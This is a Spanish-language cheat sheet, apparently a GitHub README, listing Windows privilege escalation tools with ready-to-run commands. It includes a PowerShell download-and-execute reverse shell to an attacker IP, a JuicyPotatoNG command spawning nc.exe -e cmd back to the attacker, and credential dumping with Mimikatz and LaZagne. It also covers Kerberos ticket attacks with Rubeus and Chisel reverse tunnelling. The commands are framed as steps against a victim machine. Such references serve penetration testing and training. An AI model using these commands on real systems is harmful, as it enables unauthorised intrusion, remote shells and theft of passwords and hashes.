
# WINDOWS PRIVILEGE ESCALATION

Programas para escalar privilegios en sistemas Windows.




## WinPEAS

Este programa es utilizado para escanear el sistema en busca de archivos interesantes, malas configuraciones e información del sistema.

#### COMANDOS

```
  ./WinPEAS.exe
```

## SharpHound

Extrae información del **Directorio Activo**, este programa generará un archivo.zip que subiremos posteriormente a BloodHound.

#### COMANDOS

```
  ./SharpHound.exe -c All
```

## [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/README.md) 🔗

Módulo que importa funciones que simplifican la ejecución de comandos dedicados a **Directorio Activo**.

#### COMANDOS

```
  . ./PowerView.ps1
```
#### USO BÁSICO

```
  Get-Domain
  Get-NetGroup
  Get-DomainUser
  Get-DomainSID
```

## [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/README.md) 🔗

Módulo que importa funciones para facilitar la enumeración del sistema, como listar los registros, encontrar posibles DLL Hijacking.

#### COMANDOS

```
  . ./PowerUp.ps1
```
#### USO BÁSICO

```
  Find-ProcessDLLHijack 
  Get-RegistryAlwaysInstallElevated 
  Get-ModifiableScheduledTaskFile
  Get-RegistryAutoLogon    
```

## [Rubeus](https://github.com/GhostPack/Rubeus/blob/master/README.md) 🔗

Programa utilizado para la explotación de **Kerberos** desde la máquina víctima, se podrá realizar una gran cantidad de ataques como AsreProast, Kerberoasting, Golden y Silver Ticket...

#### COMANDOS

```
  rubeus.exe asktgt /user:USER </password:PASSWORD /aes256:HASH> [/domain:DOMAIN] ...
```
#### USO BÁSICO

```
  rubeus.exe asktgt
  rubeus.exe asktgs
  rubeus.exe s4u
  rubeus.exe golden 
  rubeus.exe silver
  rubeus.exe diamond
  rubeus.exe dump
  rubeus.exe kerberoast 
  rubeus.exe asreproast
```

## [PowerCat](https://github.com/besimorhino/powercat/blob/master/README.md) 🔗

Con PowerCat puedes realizar una Reverse Shell. Primero debes encontrar la forma de ejecutar comandos, una vez conseguido abre un servidor en la ruta donde tengas el PowerCat:

#### COMANDOS
```
python3 -m http.server 80
```

Ahora ejecuta este comando en la máquina víctima, recuerda cambiar las IP y el puerto por los TUYOS.

```
  powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<IP-atacante>/powercat.ps1');powercat -c <IP-atacante> -p <PUERTO-atacante> -e powershell"
```

## [JuicyPotatoNG](https://github.com/antonioCoco/JuicyPotatoNG/blob/main/README.md) 🔗

Este programa explota el privilegio **SeImpersonatePrivilege** se puede comprobar ejecutando el siguiente comando:

```
whoami /priv
```

<img src="https://infiniteloginscom.files.wordpress.com/2020/12/image-42.png" width="50%" height="50%">
<br>
Después subirás a la máquina víctima este archivo y nc.exe para realziar la Reverse Shell y obtener una Shell como Administrator, hay otros métodos de escalar, como por ejemplo crear un usuario y añadirlo al grupo Administrators.

#### COMANDOS
```
juicyPotatoNG.exe -t * -p C:\Windows\System32\cmd.exe -a "/c C:\Users\Public\nc.exe -e cmd <IP-atacante> <PUERTO-atacante>"
```


## [Mimikatz](https://github.com/ParrotSec/mimikatz/blob/master/README.md) 🔗

Con Mimikatz podrás extraer los hashes de los usuarios del sistema y del dominio. Ten en cuenta que deberás tener permisos elevados.

#### COMANDOS
```
./mimikatz.exe
```

#### USO BÁSICO 
```
mimikatz# privilege::debug
mimikatz# sekurlsa::logonpasswords
```

## [LaZagne](https://github.com/AlessandroZ/LaZagne/blob/master/README.md) 🔗

Es un programa similar a Mimikatz, podrás extraer contraseñas, hashes del sistema, dominio o de algunos navegadores. En mi opinión es más sencilla de usar que Mimikatz.

#### COMANDOS
```
./LaZagne.exe all     # Extrae TODO.
./LaZagne.exe all -i  # Abre la ayuda, todos los posibles comandos.
```

#### USO BÁSICO 
```
./LaZagne.exe browsers   # Extrae contraseñas de los navegadores
./LaZagne.exe Databases  # Extrae contraseñas de las BBDD
```

## [Chisel](https://github.com/jpillora/chisel/blob/master/README.md) 🔗

Seguramente ya conozcas este programa, sirve para realizar **Port Forwarding**, esto quiere decir que te podrás traer un puerto interno de la máquina víctima a tu propia máquina.

#### MÁQUINA ATACANTE
```
./chisel server --reverse -p 1234
```

#### MÁQUINA VÍCTIMA
```
./chisel.exe client <IP-ATACANTE>:1234 R:*<PUERTO-ATACANTE>:127.0.0.1:*<PUERTO-VÍCTIMA>
```

- ***PUERTO-ATACANTE**: Este puerto es el que se abrirá en tu Localhost para acceder a la máquina víctima.
- ***PUERTO-VÍCTIMA**: Este puerto es el que "robas" a la víctima, si internamente tiene abierto el 127.0.0.1:3306 y quieres acceder a el a través del 9999 el comando sería:

#### EJEMPLO
```
./chisel.exe client <IP-ATACANTE>:1234 R:9999:127.0.0.1:3306
```

## 🔗 Links
[![portfolio](https://img.shields.io/badge/my_portfolio-000?style=for-the-badge&logo=ko-fi&logoColor=white)](https://katherineoelsner.com/)
[![linkedin](https://img.shields.io/badge/linkedin-0A66C2?style=for-the-badge&logo=linkedin&logoColor=white)](https://www.linkedin.com/)
[![twitter](https://img.shields.io/badge/twitter-1DA1F2?style=for-the-badge&logo=twitter&logoColor=white)](https://twitter.com/)

